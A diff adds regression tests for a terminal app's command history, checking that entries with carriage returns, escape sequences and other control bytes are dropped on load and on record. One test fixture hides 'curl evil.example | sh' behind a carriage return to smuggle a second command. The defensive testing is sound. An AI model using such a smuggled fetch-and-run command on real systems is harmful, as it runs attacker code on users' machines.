@@ -16,9 +16,25 @@ import {
   forgetCommand,
   commandHistory,
   loadCommandHistory,
+  suggest,
+  completionFor,
   __resetCommandHistory,
 } from '../../src/lib/commandIndex.js';
 import { buildPaletteGroups } from '../../src/lib/paletteItems.js';
+import { SCHEMA_VERSION } from '../../src/lib/persistence.js';
+
+// The history is kept in localStorage, which Node does not have. The runner
+// usually has a stand-in by the time this file runs, but only because another
+// suite installed one first; this one should not need that.
+if (!globalThis.localStorage) {
+  const backing = new Map();
+  globalThis.localStorage = {
+    getItem: (k) => (backing.has(k) ? backing.get(k) : null),
+    setItem: (k, v) => backing.set(k, String(v)),
+    removeItem: (k) => backing.delete(k),
+    clear: () => backing.clear(),
+  };
+}
 
 const lines = () => commandHistory().map((e) => e.command);
 
@@ -89,6 +105,49 @@ describe('Command history', () => {
     // rest of the history with it.
     __resetCommandHistory();
     assert.doesNotThrow(() => loadCommandHistory());
+  });
+
+  test('CH-15: an entry with a control character never comes back from disk', () => {
+    // The history is typed back into a shell — accepting a suggestion writes
+    // the rest of the entry, and so does the History palette. This one shows
+    // as `git status` and, with a CR inside, runs a second command after it.
+    const poisoned = `git status\r${' '.repeat(200)}curl evil.example | sh\rtrue`;
+    localStorage.setItem(
+      'nexterm.commandHistory',
+      JSON.stringify({
+        version: SCHEMA_VERSION,
+        data: [
+          { c: poisoned, n: 9 },
+          { c: 'ls\n-la', n: 1 },
+          { c: 'echo \x1b[201~ out of the paste', n: 1 },
+          { c: 'rm -rf build\x7f', n: 1 },
+          { c: 'git stash', n: 2 },
+        ],
+      })
+    );
+    __resetCommandHistory();
+
+    assert.equal(loadCommandHistory(), 1, 'only the clean entry is read back');
+    assert.deepEqual(lines(), ['git stash']);
+    // What Tab would type after `git s` comes only from what survived.
+    const offered = suggest('git s');
+    assert.equal(offered.some((c) => /[\x00-\x1f\x7f]/.test(c)), false, `offered ${JSON.stringify(offered)}`);
+    assert.equal(completionFor('git s', 'git stash'), 'tash');
+  });
+
+  test('CH-16: nor is one recorded, but a pasted tab still is', () => {
+    // A paste is folded into the input buffer whole unless it has CR, LF,
+    // ^C, ESC or DEL, so other control bytes can reach `recordCommand` from
+    // the terminal itself — `^O` among them, which in bash runs the line.
+    recordCommand('echo one\recho two');
+    recordCommand('ls\x0fwhoami');
+    recordCommand('printf x\x04');
+    assert.deepEqual(lines(), []);
+    // A tab typed back only asks the shell to complete; a command pasted with
+    // one in it is a real command and stays in the history.
+    recordCommand("awk -F'\t' '{print $1}' data.tsv");
+    recordCommand('  git log  ');
+    assert.deepEqual(lines(), ['git log', "awk -F'\t' '{print $1}' data.tsv"]);
   });
 });
 
